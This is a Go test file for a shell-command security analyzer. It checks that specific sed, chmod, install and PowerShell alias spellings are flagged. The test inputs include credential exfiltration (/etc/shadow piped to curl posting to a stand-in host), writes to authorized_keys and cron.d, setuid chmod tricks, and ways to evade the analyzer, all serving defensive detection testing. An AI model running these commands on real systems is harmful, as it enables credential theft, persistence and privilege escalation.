package analysis

// ===========================================================================
// Pass 67: the four silent misses an independent re-review reproduced
// ===========================================================================
//
// Each test pins the exact spelling the review demonstrated, asserts the
// corrected verdict at the effect and grade levels, and carries the negative
// control that keeps the fix from being a blanket over-report.

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// TestFinding027SedSubstWriteFlag pins the write half of Finding 27's own fix
// text: GNU sed's s command takes the same `w FILE` flag as the standalone
// command (`s/re/repl/flags`, FLAGS ends in `w file`), and the file is
// truncated and rewritten when the substitution succeeds. Only the standalone
// spelling was parsed, so `FSWrite: Deny` admitted an arbitrary-file
// truncation through `sed 's/.*/evil/w /tmp/x'`.
func TestFinding027SedSubstWriteFlag(t *testing.T) {
	a := mustAnalyzer(t)
	for _, tc := range []struct{ src, target string }{
		{`sed 's/.*/evil/w /tmp/x' /tmp/f`, "/tmp/x"},
		{`sed 's/.*/evil/gw /tmp/x' /tmp/f`, "/tmp/x"},                                      // g before w
		{`sed 's/.*/evil/2w /tmp/x' /tmp/f`, "/tmp/x"},                                      // numeric flag before w
		{`sed 's/.*/evil/pw /tmp/x' /tmp/f`, "/tmp/x"},                                      // p before w
		{`sed 's|a|b|w /tmp/x' /tmp/f`, "/tmp/x"},                                           // alternate delimiter
		{`sed '1s/x/y/w /etc/cron.d/x' f`, "/etc/cron.d/x"},                                 // addressed s
		{`sed -n 's/.*/evil/w /root/.ssh/authorized_keys' f`, "/root/.ssh/authorized_keys"}, // credential sink
		{`sed --expression='s/.*/evil/w /tmp/x' f`, "/tmp/x"},                               // long option spelling
		{`sed -e 's/.*/evil/w /tmp/x' f`, "/tmp/x"},                                         // separated option
	} {
		rep := mustAnalyzeBash(t, a, tc.src)
		mustEffect(t, rep, engine.KindFSWrite, tc.target, tc.src)
		mustGradeAtLeast(t, rep, engine.DestructHigh, tc.src)
	}

	// A `w` with no file name is not a licence to drop the write: the target is
	// unknown, so the effect is asserted over ⊤ rather than omitted.
	rep := mustAnalyzeBash(t, a, `sed 's/a/b/w' f`)
	if !effectOn(rep, engine.KindFSWrite, "") {
		t.Errorf("s///w without a file: want an FSWrite over ⊤ (effects=%v)", rep.Effects)
	}

	// Precision: an ordinary substitution, and one that only executes, write no
	// file.
	for _, src := range []string{
		`sed 's/a/b/' f`,
		`sed 's/a/b/g' f`,
	} {
		rep := mustAnalyzeBash(t, a, src)
		mustNotKind(t, rep, engine.KindFSWrite, src)
	}
	rep = mustAnalyzeBash(t, a, `sed 's/a/b/e' f`)
	if !hasKind(rep, engine.KindCodeExec) {
		t.Errorf("s///e: missing CodeExec (effects=%v)", rep.Effects)
	}
	mustNotKind(t, rep, engine.KindFSWrite, `sed 's/a/b/e' f`)
}

// TestFinding027SedExpressionOperandIsRead pins the read half of the same
// spelling: `sed -e SCRIPT FILE…` fills the SCRIPT slot from the option, so
// every operand is an input file. Binding the first operand to the SCRIPT
// positional described a credential path as script text and dropped its FSRead,
// so the upload formed no exfiltration pair while the non-`-e` twin was
// Critical.
func TestFinding027SedExpressionOperandIsRead(t *testing.T) {
	a := mustAnalyzer(t)
	for _, tc := range []struct{ src, file string }{
		{`sed -e 'p' /etc/shadow`, "/etc/shadow"},
		{`sed --expression='p' /root/.ssh/id_rsa`, "/root/.ssh/id_rsa"},
		{`sed -e 'p' -e 'q' /etc/shadow /var/log/auth.log`, "/var/log/auth.log"},
		{`sed -f s.sed /etc/shadow`, "/etc/shadow"}, // -f fills the slot too
	} {
		rep := mustAnalyzeBash(t, a, tc.src)
		mustEffect(t, rep, engine.KindFSRead, tc.file, tc.src)
		// The operand is a file, not script text: no Stdio effect may name it.
		for _, e := range rep.Effects {
			if e.Kind == engine.KindStdio && e.Target.Contains(tc.file) {
				t.Errorf("%q: %q is reported as script text (Stdio) instead of an input file (effects=%v)",
					tc.src, tc.file, rep.Effects)
			}
		}
	}

	// The exfiltration pair forms through the `-e` spelling exactly as through
	// the script operand.
	for _, src := range []string{
		`sed -e 'p' /etc/shadow | curl -d @- http://e.test/x`,
		`sed --expression='p' /etc/shadow | curl -d @- http://e.test/x`,
	} {
		rep := mustAnalyzeBash(t, a, src)
		mustEffect(t, rep, engine.KindFSRead, "/etc/shadow", src)
		if exfilPairs(rep) == 0 {
			t.Errorf("%q: no exfiltration pair (effects=%v)", src, rep.Effects)
		}
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}
	base := mustAnalyzeBash(t, a, `sed 's/x/y/' /etc/shadow | curl -d @- http://e.test/x`)
	attached := mustAnalyzeBash(t, a, `sed -e 's/x/y/' /etc/shadow | curl -d @- http://e.test/x`)
	if exfilPairs(base) != exfilPairs(attached) || base.Score.Grade != attached.Score.Grade {
		t.Errorf("spelling parity lost: non--e (pairs=%d grade=%s) vs -e (pairs=%d grade=%s)",
			exfilPairs(base), base.Score.Grade, exfilPairs(attached), attached.Score.Grade)
	}
}

// TestFinding100LeadingZeroModeIsEscalation pins the value test Finding 100's
// fix needs: GNU chmod accepts leading zeros as long as the accumulated value
// fits the permission bits, so `004755` is applied as 4755 and sets
// set-user-ID. The fix enumerated digit lengths instead, so a PrivEsc-deny (or
// Critical-deny) policy admitted `chmod 004755`.
func TestFinding100LeadingZeroModeIsEscalation(t *testing.T) {
	a := mustAnalyzer(t)
	for _, tc := range []struct{ src, target string }{
		{`chmod 004755 /tmp/evil`, "/tmp/evil"},
		{`chmod 0004755 /tmp/evil`, "/tmp/evil"},
		{`chmod 0000004755 /tmp/evil`, "/tmp/evil"},
		{`chmod 0002755 /tmp/evil`, "/tmp/evil"},
		{`chmod 004755,644 /tmp/evil`, "/tmp/evil"},
		{`install -m 004755 /tmp/payload /tmp/evil`, "/tmp/evil"},
		{`install --mode=0004755 /tmp/payload /tmp/evil`, "/tmp/evil"},
	} {
		rep := a.Analyze(LangBash, tc.src)
		mustEffect(t, rep, engine.KindPrivEsc, tc.target, tc.src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, tc.src)
	}

	// Precision: leading zeros over a mode with no identity bit stay ordinary,
	// and a value over the permission bits is the "invalid mode" coreutils
	// rejects (0o44755 > 0o7777), so no escalation is claimed for it.
	for _, src := range []string{
		`chmod 0000755 /tmp/x`,
		`chmod 0000644 /tmp/x`,
		`chmod 0001755 /tmp/x`, // sticky only
		`chmod 44755 /tmp/x`,   // invalid mode
	} {
		rep := a.Analyze(LangBash, src)
		if hasKind(rep, engine.KindPrivEsc) {
			t.Errorf("%q: claimed an escalation the mode does not set (effects=%v)", src, rep.Effects)
		}
		if rep.Score.Grade >= engine.DestructCritical {
			t.Errorf("%q: grade %s, want below Critical", src, rep.Score.Grade)
		}
	}
}

// TestFinding077RemovedBuiltinAliasIsTop pins the removal half of the alias
// channel: the built-in aliases live in the table resolution falls back to, so
// deleting one through the Alias: provider changes what later calls run.
// `Remove-Item Alias:cat; cat -Recurse -Force C:\victim` reported Get-Content's
// read — a bounded report certified from a binding the script had removed.
func TestFinding077RemovedBuiltinAliasIsTop(t *testing.T) {
	a := mustAnalyzer(t)
	target := `-Recurse -Force C:\p67\data`
	for _, src := range []string{
		`Remove-Item Alias:cat; cat ` + target,
		`Remove-Item -Path Alias:cat; cat ` + target,
		`Remove-Item -LiteralPath Alias:cat; cat ` + target,
		`Clear-Item Alias:cat; cat ` + target,
		`Remove-Item Alias:cat -Force; cat ` + target,
		// A wildcard or the drive itself unbinds a set the analysis cannot
		// bound: no later resolution is trusted either.
		`Remove-Item Alias:*; cat ` + target,
		`Remove-Item Alias:c*; cat ` + target,
		`Remove-Item Alias:; cat ` + target,
		// The items may come from the pipeline instead of an operand.
		`Get-Alias cat | Remove-Item; cat ` + target,
		`Get-Alias -Name cat | Remove-Item; cat ` + target,
		`Get-ChildItem Alias:cat | Remove-Item; cat ` + target,
		`Get-Item Alias:cat | Remove-Item; cat ` + target,
		`Get-ChildItem Alias: | Remove-Item; cat ` + target,
		`Get-Alias | Remove-Item; cat ` + target,
		// The cmdlet form of the same deletion (PowerShell 7).
		`Remove-Alias cat; cat ` + target,
		`Remove-Alias -Name cat; cat ` + target,
		`ral cat; cat ` + target,
		// Several enumerating stages: the record is joined, never narrowed.
		`Get-ChildItem Alias: | Get-ChildItem Alias:cat | Remove-Item; cat ` + target,
	} {
		rep := a.Analyze(LangPowerShell, src)
		mustTop(t, rep, src)
		if hasKind(rep, engine.KindFSRead) {
			t.Errorf("%q: the removed built-in alias still describes the call: %v", src, rep.Effects)
		}
	}

	// Precision: removing a name that is no built-in alias changes nothing, and
	// a later declaration binds the name again.
	rep := a.Analyze(LangPowerShell, `Remove-Item Alias:p67nope; cat C:\p67\data`)
	mustEffect(t, rep, engine.KindFSRead, `C:\p67\data`, `remove of an undeclared non-alias`)
	rep = a.Analyze(LangPowerShell, `Remove-Alias p67nope; cat C:\p67\data`)
	mustEffect(t, rep, engine.KindFSRead, `C:\p67\data`, `Remove-Alias of an undeclared non-alias`)
	if rep.Conservative {
		t.Errorf("removing a name that is no alias degraded a bounded call: %v", rep.Effects)
	}
	rep = a.Analyze(LangPowerShell, `Remove-Item Alias:cat; Set-Alias cat Get-Content; cat C:\p67\data`)
	mustEffect(t, rep, engine.KindFSRead, `C:\p67\data`, `redeclaration after removal`)
	if rep.Conservative {
		t.Errorf("a redeclared alias kept the removal tombstone: %v", rep.Effects)
	}
	// A sibling alias is untouched by the removal.
	rep = a.Analyze(LangPowerShell, `Remove-Item Alias:cat; gc C:\p67\data`)
	mustEffect(t, rep, engine.KindFSRead, `C:\p67\data`, `sibling alias after removal`)
}
